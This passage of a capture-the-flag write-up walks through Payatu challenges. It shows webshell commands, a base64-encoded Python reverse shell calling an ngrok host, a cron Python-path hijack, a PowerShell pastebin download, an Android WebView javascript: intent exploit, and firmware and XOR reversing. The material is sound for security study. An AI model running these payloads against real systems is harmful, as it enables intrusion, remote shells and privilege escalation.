<!DOCTYPE html><html><head><title>Upload Successful - SecureFile Portal</title><style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center; }
        .container { background: rgba(255,255,255,0.97); padding: 40px 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.15); max-width: 420px; text-align: center; }
        .success-icon { font-size: 3rem; color: #48bb78; margin-bottom: 10px; }
        h2 { color: #2d3748; margin-bottom: 10px; }
        .file-info { color: #4a5568; margin: 18px 0 28px 0; font-size: 1.05rem; }
        .btn { display: inline-block; background: linear-gradient(45deg, #667eea, #764ba2); color: white; padding: 12px 32px; border-radius: 50px; text-decoration: none; font-weight: 600; margin: 10px 8px; transition: all 0.2s; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
        .btn:hover { background: linear-gradient(45deg, #764ba2, #667eea); }
        </style></head><body><div class="container"><div class="success-icon">✔️</div><h2>File Uploaded Successfully</h2><div class="file-info"">Your file <strong>shell.jpg</strong> has been securely uploaded.<br>Location: <code>/images/shell.jpg</code></div><a href="upload.php" class="btn">Upload Another File</a><a href="index.html" class="btn">Back to Portal</a></div></body></html>
┌──(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CTF/Payatu]
└─$ curl http://3.109.183.13:52772/images/shell.jpg?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1000(backupgroup)
```

```bash
┌──(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CTF/Payatu]
└─$ curl "http://3.108.53.67:50758/images/shell.jpg?cmd=echo+aW1wb3J0IG9zCmltcG9ydCBzb2NrZXQKaW1wb3J0IHN1YnByb2Nlc3MKCmRlZiByZXZlcnNlX3NoZWxsKCk6CiAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgcy5jb25uZWN0KCgiMC50Y3AuaW4ubmdyb2suaW8iLCAxOTUxOSkpCiAgICBvcy5kdXAyKHMuZmlsZW5vKCksIDApCiAgICBvcy5kdXAyKHMuZmlsZW5vKCksIDEpCiAgICBvcy5kdXAyKHMuZmlsZW5vKCksIDIpCiAgICBzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwgIi1pIl0pCnJldmVyc2Vfc2hlbGwoKQo=+>+/backups/helper.b64"

┌──(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CTF/Payatu]
└─$ curl "http://3.108.53.67:50758/images/shell.jpg?cmd=ls+-la+/backups"
total 20
drwxrwxr-x 1 root       backupgroup 159 Jun 28 16:01 .
drwxr-xr-x 1 root       root         54 Jun 28 15:44 ..
-rw-r--r-- 1 www-data   www-data    405 Jun 28 16:01 helper.b64
-rw-r--r-- 1 root       root         28 Jun 28 02:33 system_baseline.txt
-rw-rw-r-- 1 backupuser backupuser  270 Jun 28 15:59 uploads_backup_20250628_155901.tar.gz
-rw-rw-r-- 1 backupuser backupuser  270 Jun 28 16:00 uploads_backup_20250628_160001.tar.gz
-rw-rw-r-- 1 backupuser backupuser  270 Jun 28 16:01 uploads_backup_20250628_160101.tar.gz

┌──(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CTF/Payatu]
└─$ curl "http://3.108.53.67:50758/images/shell.jpg?cmd=base64+-d+/backups/helper.b64+>+/backups/helper.py"

┌──(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CTF/Payatu]
└─$ curl "http://3.108.53.67:50758/images/shell.jpg?cmd=ls+-l+/backups/helper.*"
-rw-r--r-- 1 www-data www-data 405 Jun 28 16:01 /backups/helper.b64
-rw-r--r-- 1 www-data www-data 302 Jun 28 16:01 /backups/helper.py
```

```bash
┌──(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CTF/Payatu]
└─$ curl "http://3.108.53.67:50758/images/shell.jpg?cmd=ls+-la+/var/www/html"
total 56
drwxr-xr-x 1 www-data www-data   20 Jun 28 02:32 .
drwxr-xr-x 1 root     root       18 Jun 27 15:20 ..
-rw-r--r-- 1 www-data www-data 1468 Jun 26 12:44 VERSION
-rw-r--r-- 1 www-data www-data 2450 Jun 26 12:44 admin.txt
-rw-r--r-- 1 www-data www-data 1113 Jun 26 12:44 config.php.bak
-rw-r--r-- 1 www-data www-data 3570 Jun 26 12:45 error.html
-rw-r--r-- 1 www-data www-data   39 Jun 28 02:32 flag1_K9mQ7vR3nP8jL2wX6f.txt
drwxr-xr-x 1 www-data www-data   40 Jun 28 15:46 images
-rw-rw-rw- 1 www-data www-data 5492 Jun 27 13:21 index.html
-rw-r--r-- 1 www-data www-data 4725 Jun 27 13:23 login.php
-rw-r--r-- 1 www-data www-data 6026 Jun 26 12:45 maintenance.php
-rw-r--r-- 1 www-data www-data  830 Jun 26 12:45 robots.txt
-rw-rw-rw- 1 www-data www-data 5712 Jun 26 12:45 upload.php

┌──(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CTF/Payatu]
└─$ curl "http://3.108.53.67:50758/images/shell.jpg?cmd=cat+/var/www/html/flag1_K9mQ7vR3nP8jL2wX6f.txt"
PAYATU{w3b5h3ll_upl04d_1n171al_4cc355}
```

### 7

at first ran a find command for searching flag2, we hit `/home/backupuser/flag2.txt`. next I looked at cronjobs, at noticed this line.

```bash
* * * * * root cd /backups && PYTHONPATH=/backups /usr/bin/python3 /opt/backup.py >> /tmp/backup_verify.log 2>&1
```

and in the `/opt/backup.py`, we find this import line.

```bash
import backup_utils  # Custom backup utilities module
```

Python looks for `backup_utils.py` **in the current `sys.path`**, which includes:

1. Current working directory (`/backups` in this case because of `cd /backups`)
2. The `PYTHONPATH` environment variable (also `/backups`)
3. Site-packages and standard library paths

So because `PYTHONPATH=/backups`, Python will look in `/backups/backup_utils.py` — and import it successfully.

```bash
┌──(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CTF/Payatu]
└─$ curl "http://52.66.252.22:52566/images/shell.jpg?cmd=echo+aW1wb3J0IG9zCmRlZiBpbml0aWFsaXplKCk6CiAgICBvcy5zeXN0ZW0oImNwIC9ob21lL2JhY2t1cHVzZXIvZmxhZzIudHh0IC92YXIvd3d3L2h0bWwvaW1hZ2VzL2ZsYWcyLnR4dCIpCiAgICBvcy5zeXN0ZW0oImNobW9kIDY0NCAvdmFyL3d3dy9odG1sL2ltYWdlcy9mbGFnMi50eHQiKQo=+>+/backups/backup_utils.b64"

curl "http://52.66.252.22:52566/images/shell.jpg?cmd=base64+-d+/backups/backup_utils.b64+>+/backups/backup_utils.py"

┌──(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CTF/Payatu]
└─$ curl "http://52.66.252.22:52566/images/shell.jpg?cmd=cat+/backups/backup_utils.py"
import os
def initialize():
    os.system("cp /home/backupuser/flag2.txt /var/www/html/images/flag2.txt")
    os.system("chmod 644 /var/www/html/images/flag2.txt")
```

next, we just abuse the cronjob and read the flag.

```bash
┌──(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CTF/Payatu]
└─$ curl "http://52.66.252.22:52566/images/shell.jpg?cmd=ls+-ls+/var/www/html/images/"
total 8
4 -rw-r--r-- 1 root     root     57 Jun 28 17:10 flag2.txt
4 -rw-r--r-- 1 www-data www-data 31 Jun 28 16:45 shell.jpg

┌──(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CTF/Payatu]
└─$ curl http://52.66.252.22:52566/images/flag2.txt
PAYATU{p4th_h1j4ck1ng_5ucc355ful_www_d474_70_b4ckupu53r}
```

### 8

reverse shell doesn’t seem to be working in this docker environment.

```bash
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 55981
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2254312d6a9a:/var/www/html/images$
```

even though we get a hit back, none of the commands get executed and it just hangs.

## OSINT

### Flight of the Lurk3r

```bash
└─$ md5sum WindowSeatA+1.zip 
088858b0048b014e450d40bade8cb89d  WindowSeatA+1.zip
```

## Forensics

### 2

```bash
└─$ oleobj harmless.docx
oleobj 0.60.1 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

-------------------------------------------------------------------------------
File: 'harmless.docx'
Found relationship 'oleObject' with external link mhtml:http://PAYATU{f0ll1n4_1n_4ction}/colors.html!x-usc:http://PAYATU{f0ll1n4_1n_4ction}/colors.html
Potential exploit for CVE-2021-40444
```

### 4

{{< figure src="image.png" alt="image" >}}

```bash
powershell -c 'http://pastebin.com/M6hLDcWA' | Out-File $env:TEMP\sneaky
```

{{< figure src="image 1.png" alt="image 1" >}}

`PAYATU{Th1s_w45_n0t_th4t_3a5y}`

## Mobile

### PathFinder

{{< figure src="image 2.png" alt="image 2" >}}

```bash
PS C:\Users\abura> adb shell am start -a android.intent.action.VIEW -d "https://ctf.payatu/web?url=javascript:AndroidFunction.showFlag()"
/system/bin/sh: syntax error: unexpected '('
PS C:\Users\abura> adb shell am start -a android.intent.action.VIEW -d "https://ctf.payatu/web?url=javascript:AndroidFunction.showFlag%28%29"
Starting: Intent { act=android.intent.action.VIEW dat=https://ctf.payatu/... }
PS C:\Users\abura> adb shell am start -a android.intent.action.VIEW -d "https://ctf.payatu/web?url=javascript:AndroidFunction.showFlag%28%29"
Starting: Intent { act=android.intent.action.VIEW dat=https://ctf.payatu/... }
PS C:\Users\abura> adb shell am start -a android.intent.action.VIEW -d "https://ctf.payatu/web?url=javascript:AndroidFunction.showFlag%28%29"
Starting: Intent { act=android.intent.action.VIEW dat=https://ctf.payatu/... }
PS C:\Users\abura> adb shell am start -d "ctf://payatu/web?url=javascript:AndroidFunction.showFlag%28%29"
Starting: Intent { dat=ctf://payatu/... }
PS C:\Users\abura> Get-ChildItem -Recurse -Filter *.smali | Select-String "showFlag"
PS C:\Users\abura> ^C
PS C:\Users\abura> cd ..\..\Main\CyberSec\CTF\Payatu\PathFinder\
PS C:\Main\CyberSec\CTF\Payatu\PathFinder> Get-ChildItem -Recurse -Filter *.smali | Select-String "showFlag"

smali_classes4\com\ctf\pathfinder\MainActivity$JavaScriptHandler$$ExternalSyntheticLambda0.smali:33:    invoke-virtual
{v0}, Lcom/ctf/pathfinder/MainActivity$JavaScriptHandler;->lambda$showFlag$0$com-ctf-pathfinder-MainActivity$JavaScript
Handler()V
smali_classes4\com\ctf\pathfinder\MainActivity$JavaScriptHandler.smali:54:.method synthetic
lambda$showFlag$0$com-ctf-pathfinder-MainActivity$JavaScriptHandler()V
smali_classes4\com\ctf\pathfinder\MainActivity$JavaScriptHandler.smali:97:.method public showFlag()V

PS C:\Main\CyberSec\CTF\Payatu\PathFinder> adb shell am start -a android.intent.action.VIEW -d "ctf://payatu/web?url=javascript:AndroidFunction.showFlag()"
/system/bin/sh: syntax error: unexpected '('
PS C:\Main\CyberSec\CTF\Payatu\PathFinder> adb shell am start -a android.intent.action.VIEW -d "ctf://payatu/web?url=javascript:AndroidFunction.showFlag%28%29"
Starting: Intent { act=android.intent.action.VIEW dat=ctf://payatu/... }
PS C:\Main\CyberSec\CTF\Payatu\PathFinder> adb shell am start -a android.intent.action.VIEW -d "ctf://payatu/web?url=javascript:AndroidFunction.showFlag%28%29"
Starting: Intent { act=android.intent.action.VIEW dat=ctf://payatu/... }
PS C:\Main\CyberSec\CTF\Payatu\PathFinder> adb shell am start -a android.intent.action.VIEW -d "ctf://payatu/web?url=javascript:AndroidFunction.showFlag%28%29"
Starting: Intent { act=android.intent.action.VIEW dat=ctf://payatu/... }
PS C:\Main\CyberSec\CTF\Payatu\PathFinder> adb shell monkey -p com.ctf.pathfinder -c android.intent.category.LAUNCHER 1
  bash arg: -p
  bash arg: com.ctf.pathfinder
  bash arg: -c
  bash arg: android.intent.category.LAUNCHER
  bash arg: 1
args: [-p, com.ctf.pathfinder, -c, android.intent.category.LAUNCHER, 1]
 arg: "-p"
 arg: "com.ctf.pathfinder"
 arg: "-c"
 arg: "android.intent.category.LAUNCHER"
 arg: "1"
data="com.ctf.pathfinder"
data="android.intent.category.LAUNCHER"
Events injected: 1
## Network stats: elapsed time=9ms (0ms mobile, 0ms wifi, 9ms not connected)
PS C:\Main\CyberSec\CTF\Payatu\PathFinder> adb shell monkey -p com.ctf.pathfinder -c android.intent.category.LAUNCHER 1
  bash arg: -p
  bash arg: com.ctf.pathfinder
  bash arg: -c
  bash arg: android.intent.category.LAUNCHER
  bash arg: 1
args: [-p, com.ctf.pathfinder, -c, android.intent.category.LAUNCHER, 1]
 arg: "-p"
 arg: "com.ctf.pathfinder"
 arg: "-c"
 arg: "android.intent.category.LAUNCHER"
 arg: "1"
data="com.ctf.pathfinder"
data="android.intent.category.LAUNCHER"
Events injected: 1
## Network stats: elapsed time=35ms (0ms mobile, 0ms wifi, 35ms not connected)
PS C:\Main\CyberSec\CTF\Payatu\PathFinder> adb shell monkey -p com.ctf.pathfinder -c android.intent.category.LAUNCHER 1
  bash arg: -p
  bash arg: com.ctf.pathfinder
  bash arg: -c
  bash arg: android.intent.category.LAUNCHER
  bash arg: 1
args: [-p, com.ctf.pathfinder, -c, android.intent.category.LAUNCHER, 1]
 arg: "-p"
 arg: "com.ctf.pathfinder"
 arg: "-c"
 arg: "android.intent.category.LAUNCHER"
 arg: "1"
data="com.ctf.pathfinder"
data="android.intent.category.LAUNCHER"
Events injected: 1
## Network stats: elapsed time=19ms (0ms mobile, 0ms wifi, 19ms not connected)
```

{{< figure src="image 3.png" alt="image 3" >}}

enable usb debugging in mobile. then you find out from `MainActivity.smali` that [payatu.com](http://payatu.com/) is valid host, eh no it was in `res/values/strings.xml`, then u see webview abuse, after that,  sent the intent(exploit) `adb shell am start -d "ctf://payatu/web?url=javascript:AndroidFunction.showFlag()"` the app then loads this in the webview, next open chrome in pc and go to `chrome://inspect#devices` , open the app in mobile and wait for it to show up, hit inspect, and call the flag with `AndroidFunction.showFlag()` now the flag is show in the app.

{{< figure src="image 4.png" alt="image 4" >}}

## Miscellaneous

### Operation PE

{{< figure src="image 5.png" alt="image 5" >}}

downloads the `pdb` file from microsoft.

{{< figure src="image 6.png" alt="image 6" >}}

## Firmware

### Hik-Secrets

[How to extract .dav firmware files for Hikvision cameras?](https://ipcamtalk.com/threads/how-to-extract-dav-firmware-files-for-hikvision-cameras.71444/)

[https://github.com/MatrixEditor/hiktools](https://github.com/MatrixEditor/hiktools)

```bash
└─$ python3 -m hiktools.fmod digicap.dav out/
Got 30 files to save!
> File name="execSystemCmd", size=1384, pos=7168, checksum=536975
> File name="IElang.tar", size=8552, pos=1290240, checksum=162709839
> File name="ASC16.bin", size=1298792, pos=1349, checksum=181815
> File name="sound.tar.gz", size=1300141, pos=145562, checksum=19361699
> File name="lib_so.tar.gz", size=1445703, pos=1618951, checksum=217801772
> File name="t1", size=3064654, pos=276921, checksum=19688118
> File name="driver.tar.gz", size=3341575, pos=1382758, checksum=185700231
> File name="cmemk.ko", size=4724333, pos=14269, checksum=980102
> File name="GBK", size=4738602, pos=457196, checksum=61467495
> File name="_cfgUpgSecPls", size=5195798, pos=2476, checksum=305381
> File name="_cfgUpgClass", size=5198274, pos=352, checksum=16438
> File name="pppd", size=5198626, pos=187452, checksum=19208881
> File name="davinci.tar.gz", size=5386078, pos=4206780, checksum=536431288
> File name="recover_mtd", size=9592858, pos=14269, checksum=1018725
> File name="hroot.img", size=9607127, pos=3064307, checksum=415966556
> File name="alsa-lib.tar.gz", size=12671434, pos=15136, checksum=1974573
> File name="WebComponents.exe", size=12686570, pos=2410840, checksum=306142980
> File name="da_info", size=15097410, pos=29568, checksum=2805450
> File name="ambarella_eth_debug.ko", size=15126978, pos=8696, checksum=501530
> File name="gdmak.ko", size=15135674, pos=5940, checksum=315506
> File name="check_config", size=15141614, pos=5820, checksum=352773
> File name="ss", size=15147434, pos=5820, checksum=318488
> File name="IEfile.tar.gz", size=15153254, pos=587196, checksum=74897152
> File name="ptzCfg.bin", size=15740450, pos=49015, checksum=270591
> File name="help.tar.gz", size=15789465, pos=236197, checksum=30604731
> File name="davinci", size=16025662, pos=8, checksum=744
> File name="pppoed", size=16025670, pos=18280, checksum=1305453
> File name="initrun.sh", size=16043950, pos=6041, checksum=548610
> File name="hImage", size=16049991, pos=5077060, checksum=538177427
> File name="idsp.tar.gz", size=21127051, pos=494957, checksum=67406624
```

under `hImage`, we found this.

```bash
Scan Time:     2025-06-29 06:33:41
Target File:   /mnt/c/Main/CyberSec/CTF/Payatu/3/out/_hImage.extracted/initrd
MD5 Checksum:  0be4f56ed8c05cc7dd477bf7856ef376
Signatures:    436

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Linux EXT filesystem, blocks count: 8192, image size: 8388608, rev 0.0, ext2 filesystem data, UUID=00000000-0000-0000-0000-000000000000
```

now let’s mount the `ext4` file-system ad check out the contents.

```bash
┌──(omni)(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CTF/Payatu/3]
└─$ mkdir /tmp/hik

┌──(omni)(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CTF/Payatu/3]
└─$ sudo mount -o loop /mnt/c/Main/CyberSec/CTF/Payatu/3/out/_hImage.extracted/initrd /tmp/hik
```

and out comes the flag.

```bash
└─$ grep -r "PAYATU"
etc/init.d/rcS:/bin/echo "flag --> PAYATU{H1kvisi0ns_a4e_n0t_Fun}
```

### **F4lling metal**

```bash
┌──(omni)(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CTF/Payatu/3]
└─$ r2 -a arm -b 16 -m 0x08000000 -w stm32f411.bin 
WARN: using oba to load the syminfo from different mapaddress
[0x08000000]> aaa
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze symbols (af@@@s)
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: find and analyze function preludes (aap)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Analyzing methods (af @@ method.*)
INFO: Emulate functions to find computed references (aaef)
INFO: Recovering local variables (afva@@@F)
INFO: Type matching analysis for all functions (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Use -AA or aaaa to perform additional experimental analysis
INFO: Finding xrefs in noncode sections (e anal.in=io.maps.x; aav)
[0x08000000]> pd 32
            ;-- pc:
            ;-- r15:
┌ 400: fcn.08000000 ();
│           0x08000000      0000           movs r0, r0
│           0x08000002      0220           movs r0, 2
│           0x08000004      e802           lsls r0, r5, 0xb
│           0x08000006      0008           lsrs r0, r0, 0x20
│           0x08000008      ee02           lsls r6, r5, 0xb
│           0x0800000a      0008           lsrs r0, r0, 0x20
│           0x0800000c      ee02           lsls r6, r5, 0xb
│           0x0800000e      0008           lsrs r0, r0, 0x20
│           0x08000010      ee02           lsls r6, r5, 0xb
│           0x08000012      0008           lsrs r0, r0, 0x20
│           0x08000014      ee02           lsls r6, r5, 0xb
│           0x08000016      0008           lsrs r0, r0, 0x20
│           0x08000018      ee02           lsls r6, r5, 0xb
│           0x0800001a      0008           lsrs r0, r0, 0x20
│           0x0800001c      0000           movs r0, r0
│           0x0800001e      0000           movs r0, r0
│           0x08000020      0000           movs r0, r0
│           0x08000022      0000           movs r0, r0
│           0x08000024      0000           movs r0, r0
│           0x08000026      0000           movs r0, r0
│           0x08000028      0000           movs r0, r0
│           0x0800002a      0000           movs r0, r0
│           0x0800002c      ee02           lsls r6, r5, 0xb
│           0x0800002e      0008           lsrs r0, r0, 0x20
│           0x08000030      ee02           lsls r6, r5, 0xb
│           0x08000032      0008           lsrs r0, r0, 0x20
│           0x08000034      0000           movs r0, r0
│           0x08000036      0000           movs r0, r0
│           0x08000038      ee02           lsls r6, r5, 0xb
│           0x0800003a      0008           lsrs r0, r0, 0x20
│           0x0800003c      ee02           lsls r6, r5, 0xb
│           0x0800003e      0008           lsrs r0, r0, 0x20
[0x08000000]> pxw 4 @ 0x08000004
0x08000004  0x080002e8                                   ....
[0x08000000]> s 0x080002e8
[0x080002e8]> af
[0x080002e8]> pdf
┌ 6: fcn.080002e8 ();
│           0x080002e8      fff7d4ff       bl fcn.08000294
└        ─> 0x080002ec      fee7           b 0x80002ec
[0x080002e8]> s 0x08000294
[0x08000294]> af
[0x08000294]> pdf
            ; CALL XREF from fcn.080002e8 @ 0x80002e8(x)
┌ 64: fcn.08000294 ();
│           0x08000294      10b5           push {r4, lr}
│           0x08000296      0f48           ldr r0, aav.0x080002f0      ; [0x80002f0:4]=0x65746e45 ; "Enter flag: "
│           0x08000298      fff77aff       bl fcn.08000190
│           0x0800029c      fff7acff       bl fcn.080001f8
│           0x080002a0      0d49           ldr r1, [0x080002d8]        ; [0x80002d8:4]=0x20000000
│           ; CODE XREF from fcn.08000294 @ 0x80002ca(x)
│       ┌─> 0x080002a2      0b68           ldr r3, [r1]
│       ╎   0x080002a4      3f2b           cmp r3, 0x3f                ; 63
│      ┌──< 0x080002a6      07dd           ble 0x80002b8
│      │╎   0x080002a8      0c48           ldr r0, [0x080002dc]        ; [0x80002dc:4]=0x20000004
│      │╎   0x080002aa      fff7aeff       bl fcn.0800020a
│     ┌───< 0x080002ae      68b1           cbz r0, 0x80002cc
│     ││╎   0x080002b0      0b48           ldr r0, [0x080002e0]        ; [0x80002e0:4]=0x80002fd
│     ││╎   0x080002b2      fff7a1ff       bl fcn.080001f8
│     ││╎   ; CODE XREF from fcn.08000294 @ 0x80002d2(x)
│    ┌────> 0x080002b6      fee7           b 0x80002b6
│    ╎││╎   ; CODE XREF from fcn.08000294 @ 0x80002a6(x)
│    ╎│└──> 0x080002b8      fff794ff       bl fcn.080001e4
│    ╎│ ╎   0x080002bc      fff78aff       bl fcn.080001d4
│    ╎│ ╎   0x080002c0      0b68           ldr r3, [r1]
│    ╎│ ╎   0x080002c2      5a1c           adds r2, r3, 1
│    ╎│ ╎   0x080002c4      0b44           add r3, r1
│    ╎│ ╎   0x080002c6      0a60           str r2, [r1]
│    ╎│ ╎   0x080002c8      1871           strb r0, [r3, 4]
│    ╎│ └─< 0x080002ca      eae7           b 0x80002a2
│    ╎│     ; CODE XREF from fcn.08000294 @ 0x80002ae(x)
│    ╎└───> 0x080002cc      0548           ldr r0, aav.0x08000308      ; [0x8000308:4]=0x6f72570a ; "\nWrong.\n"
│    ╎      0x080002ce      fff793ff       bl fcn.080001f8
└    └────< 0x080002d2      f0e7           b 0x80002b6
[0x08000294]> s 0x0800020a
[0x0800020a]> af
[0x0800020a]> pdf
            ; CALL XREF from fcn.08000294 @ 0x80002aa(x)
┌ 116: fcn.0800020a (int16_t arg1);
│ `- args(r0) vars(8:sp[0x1f..0x50])
│           0x0800020a      70b5           push {r4, r5, r6, lr}
│           0x0800020c      90b0           sub sp, 0x40
│           0x0800020e      6a46           mov r2, sp
│           0x08000210      1b4c           ldr r4, [0x08000280]        ; [0x8000280:4]=0x8000311
│           0x08000212      1146           mov r1, r2
│           0x08000214      1023           movs r3, 0x10
│           ; CODE XREF from fcn.0800020a @ 0x8000220(x)
│       ┌─> 0x08000216      14f8015b       ldrb r5, [r4], 1
│       ╎   0x0800021a      01f8015b       strb r5, [r1], 1
│       ╎   0x0800021e      013b           subs r3, 1
│       └─< 0x08000220      f9d1           bne 0x8000216
│           0x08000222      184c           ldr r4, [0x08000284]        ; [0x8000284:4]=0x8000321
│           0x08000224      04a9           add r1, var_10h
│           0x08000226      1023           movs r3, 0x10
│           ; CODE XREF from fcn.0800020a @ 0x8000232(x)
│       ┌─> 0x08000228      14f8015b       ldrb r5, [r4], 1
│       ╎   0x0800022c      01f8015b       strb r5, [r1], 1
│       ╎   0x08000230      013b           subs r3, 1
│       └─< 0x08000232      f9d1           bne 0x8000228
│           0x08000234      144c           ldr r4, [0x08000288]        ; [0x8000288:4]=0x8000331
│           0x08000236      08a9           add r1, var_20h
│           0x08000238      1023           movs r3, 0x10
│           ; CODE XREF from fcn.0800020a @ 0x8000244(x)
│       ┌─> 0x0800023a      14f8015b       ldrb r5, [r4], 1
│       ╎   0x0800023e      01f8015b       strb r5, [r1], 1
│       ╎   0x08000242      013b           subs r3, 1
│       └─< 0x08000244      f9d1           bne 0x800023a
│           0x08000246      114c           ldr r4, [0x0800028c]        ; [0x800028c:4]=0x8000341
│           0x08000248      0ca9           add r1, var_30h
│           0x0800024a      1023           movs r3, 0x10
│           ; CODE XREF from fcn.0800020a @ 0x8000256(x)
│       ┌─> 0x0800024c      14f8015b       ldrb r5, [r4], 1
│       ╎   0x08000250      01f8015b       strb r5, [r1], 1
│       ╎   0x08000254      013b           subs r3, 1
│       └─< 0x08000256      f9d1           bne 0x800024c
│           0x08000258      0d4c           ldr r4, [0x08000290]        ; [0x8000290:4]=0x8000351
│           0x0800025a      431e           subs r3, r0, 1              ; arg1
│           0x0800025c      3f30           adds r0, 0x3f
│           ; CODE XREF from fcn.0800020a @ 0x8000272(x)
│       ┌─> 0x0800025e      12f8011b       ldrb r1, [r2], 1
│       ╎   0x08000262      13f8016f       ldrb r6, [r3, 1]!
│       ╎   0x08000266      14f8015b       ldrb r5, [r4], 1
│       ╎   0x0800026a      7140           eors r1, r6
│       ╎   0x0800026c      a942           cmp r1, r5
│      ┌──< 0x0800026e      04d1           bne 0x800027a
│      │╎   0x08000270      8342           cmp r3, r0
│      │└─< 0x08000272      f4d1           bne 0x800025e
│      │    0x08000274      0120           movs r0, 1
│      │    ; CODE XREF from fcn.0800020a @ 0x800027c(x)
│      │┌─> 0x08000276      10b0           add sp, 0x40
│      │╎   0x08000278      70bd           pop {r4, r5, r6, pc}
│      │╎   ; CODE XREF from fcn.0800020a @ 0x800026e(x)
│      └──> 0x0800027a      0020           movs r0, 0
└       └─< 0x0800027c      fbe7           b 0x8000276
[0x0800020a]> px 0x40 @ 0x08000311
- offset -  1112 1314 1516 1718 191A 1B1C 1D1E 1F20  123456789ABCDEF0
0x08000311  611e 136e 332f 2c21 6e1d 666e 551b 5b46  a..n3/,!n.fnU.[F
0x08000321  1413 1b2b 2d50 5d13 5729 6b63 6955 452c  ...+-P].W)kciUE,
0x08000331  495b 3377 7f10 7177 2469 463b 3323 2b71  I[3w..qw$iF;3#+q
0x08000341  3b1d 1b40 1c3d 7c3c 5d31 7715 6d4a 541f  ;..@.=|<]1w.mJT.
[0x0800020a]> px 0x40 @ 0x08000351
- offset -  5152 5354 5556 5758 595A 5B5C 5D5E 5F60  123456789ABCDEF0
0x08000351  315f 4a2f 677a 5763 5a6f 5503 666f 6f2a  1_J/gzWcZoU.foo*
0x08000361  4b61 285d 1e22 2e22 394e 3452 1a0a 0359  Ka(]."."9N4R...Y
0x08000371  0704 0211 2069 4102 7b02 280b 447c 4341  .... iA.{.(.D|CA
0x08000381  4c42 6f70 4370 484c 0200 0334 4c6b 7562  LBopCpHL...4Lkub
[0x0800020a]>
```

The function at `0x0800020a` checks the flag by XORing your input with a 64-byte key (from `0x08000311`–`0x08000341`) and comparing the result to expected bytes at `0x08000351`.

Now we can write a script to decrypt the xor encryption, so basically it boils down to `(input[i] ^ key[i]) == expected[i]`.

```bash
key = bytes.fromhex("""
61 1e 13 6e 33 2f 2c 21 6e 1d 66 6e 55 1b 5b 46
14 13 1b 2b 2d 50 5d 13 57 29 6b 63 69 55 45 2c
49 5b 33 77 7f 10 71 77 24 69 46 3b 33 23 2b 71
3b 1d 1b 40 1c 3d 7c 3c 5d 31 77 15 6d 4a 54 1f
""".replace("\n", "").strip())

expected = bytes.fromhex("""
31 5f 4a 2f 67 7a 57 63 5a 6f 55 03 66 6f 6f 2a
4b 61 28 5d 1e 22 2e 22 39 4e 34 52 1a 0a 03 59
07 04 02 11 20 69 41 02 7b 02 28 0b 44 7c 43 41
4c 42 6f 70 43 70 48 4c 02 00 03 34 4c 6b 75 62
""".replace("\n", "").strip())

flag = bytes([k ^ e for k, e in zip(key, expected)])
print("Flag:", flag.decode())
```

{{< figure src="image 7.png" alt="image 7" >}}

### bfa

```bash
┌──(omni)(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CTF/Payatu/3]
└─$ file bfa.bin 
bfa.bin: Squashfs filesystem, little endian, version 4.0, xz compressed, 19787390 bytes, 2515 inodes, blocksize: 1048576 bytes, created: Thu Jun 26 05:49:15 2025

┌──(omni)(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CTF/Payatu/3]
└─$ unsquashfs -d bfa-rootfs bfa.bin
Parallel unsquashfs: Using 8 processors
2128 inodes (1816 blocks) to write

[=================================================================================================/                           ] 3086/3944  78%
FATAL ERROR: write_file: file bfa-rootfs/lib/modules/6.6.28/kernel/net/netfilter/xt_dscp.ko.xz already exists

┌──(omni)(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CTF/Payatu/3]
└─$ cd bfa-rootfs/

┌──(omni)(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CTF/Payatu/3/bfa-rootfs]
└─$ ls
bin  dev  etc  lib
```

for some reason `unsquashfs` doesn’t extract the root directory, so I just did this.

 

```bash
┌──(omni)(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CTF/Payatu/3]
└─$ unsquashfs -d root bfa.bin root
Parallel unsquashfs: Using 8 processors
1 inodes (1 blocks) to write

[==================================================================================================================================|] 2/2 100%

created 1 file
created 2 directories
created 0 symlinks
created 0 devices
created 0 fifos
created 0 sockets
created 0 hardlinks

┌──(omni)(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CTF/Payatu/3]
└─$ cat root/root/encrypted_flag.txt 
